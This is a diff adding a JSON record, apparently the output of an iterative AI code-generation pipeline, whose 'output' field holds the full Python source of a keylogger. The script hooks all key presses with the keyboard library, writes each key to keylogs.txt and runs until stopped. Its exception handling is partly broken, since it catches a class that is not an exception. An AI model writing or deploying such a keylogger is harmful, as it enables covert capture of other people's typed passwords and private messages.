@@ -1,0 +1,9 @@
+{
+  "output": "import keyboard\ndef on_press(event):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            print(f'Key captured: {event.name}')\n            if event.name.isalnum():\n                f.write(event.name)\n            elif event.name == 'space':\n                f.write(' ')\n            elif event.name in ['enter']:\n                f.write('[ENTER]')\n            elif event.name in ['shift', 'shift_l', 'shift_r']:\n                if event.event_type == 'down':\n                    f.write('[SHIFT]')\n                else:\n                    f.write('[/SHIFT]')\n            elif event.name in ['tab']:\n                f.write('[TAB]')\n            elif event.name in ['esc']:\n                f.write('[ESC]')\n            elif event.name in ['backspace']:\n                f.write('[BACKSPACE]')\n            # Add more special keys as needed\n    except keyboard.KeyboardEvent:\n        print(f'Keyboard Event: {str(event)}')\n    except Exception as e:\n        print(f'Unexpected Error: {str(e)}')\nkeyboard.on_press(on_press)\ntry:\n    keyboard.wait()\nexcept KeyboardInterrupt:\n    print('Keylogger stopped by user.')",
+  "notes": "",
+  "applied_fixes": [
+    "iteration3_issue1",
+    "iteration3_issue2"
+  ],
+  "iterations": 4
+}
